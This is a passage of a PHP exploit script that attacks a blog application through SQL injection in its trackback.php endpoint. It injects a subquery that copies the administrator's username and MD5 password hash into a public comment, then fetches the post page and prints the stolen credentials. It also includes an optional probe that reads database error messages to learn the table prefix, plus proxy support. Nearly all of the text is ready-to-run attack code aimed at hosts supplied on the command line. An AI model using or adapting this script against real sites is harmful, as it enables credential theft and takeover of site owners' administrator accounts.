INSERT INTO mb_comment SET post_id='1', comment_subject='hi',comments=(SELECT CONCAT('<!--',password,'-->')FROM mb_user)/*', comments='whatever',
com_tstamp='1154799697' ,
poster = 'whatever', home='http://www.suntzu.org', comment_type='trackback'
                                                                              */

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
   $c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
   }
  }
fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

function is_hash($hash)
{
 if (ereg("^[a-f0-9]{32}",trim($hash))) {return true;}
 else {return false;}
}

$host=$argv[1];
$path=$argv[2];
$port=80;
$prefix="mb_";
$post_id="1";//admin
$proxy="";
$dt=0;
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
if ($temp=="-T")
{
  $prefix=str_replace("-T","",$argv[$i]);
}
if ($temp=="-i")
{
  $post_id=(int) str_replace("-i","",$argv[$i]);
  echo "post id -> ".$post_id."\n";
}
if ($temp=="-d")
{
  $dt=1;
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

if ($dt)
{
$packet ="GET ".$p."index.php?mode=viewdate HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
if (strstr($html,"You have an error in your SQL syntax"))
{
  $temp=explode("UNIXTIME(",$html);
  $temp2=explode("posts.timest",$temp[1]);
  $prefix=$temp2[0];
  echo "table prefix -> ".$prefix."\n";
}
}

$sql="%2527,comments=(SELECT CONCAT(%2527<!--%2527,password,%2527-->%2527)FROM ".$prefix."user)/*";
//some problems with argument length, maybe with prefix > 3 chars you will have some error, cut the '<!--' but hash will be clearly visible in comments
$data="title=hi".$sql;
$data.="&url=http%3a%2f%2fwww%2esuntzu%2eorg";
$data.="&excerpt=whatever";
$data.="&blog_name=whatever";
$packet ="POST ".$p."trackback.php/$post_id HTTP/1.0\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);

$sql="%2527,comments=(SELECT CONCAT(%2527<!--%2527,user,%2527-->%2527)FROM ".$prefix."user)/*";
$data="title=hi".$sql;
$data.="&url=http%3a%2f%2fwww%2esuntzu%2eorg";
$data.="&excerpt=whatever";
$data.="&blog_name=whatever";
$packet ="POST ".$p."trackback.php/$post_id HTTP/1.0\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
sleep(1);

$packet ="GET ".$p."index.php?mode=viewid&post_id=$post_id HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
//echo $html;
$temp=explode('"message"><!--',$html);
for ($i=1; $i<count($temp); $i++)
{
$temp2=explode("-->",$temp[$i]);
if (is_hash($temp2[0]))
{
  $hash=$temp2[0];
  $temp2=explode("-->",$temp[$i+1]);
  $admin=$temp2[0];
  echo "----------------------------------------------------------------\n";
  echo "admin          -> ".$admin."\n";
  echo "password (md5) -> ".$hash."\n";
  echo "----------------------------------------------------------------\n";
  die();
}
}
//if you are here...
echo "exploit failed...";
?>


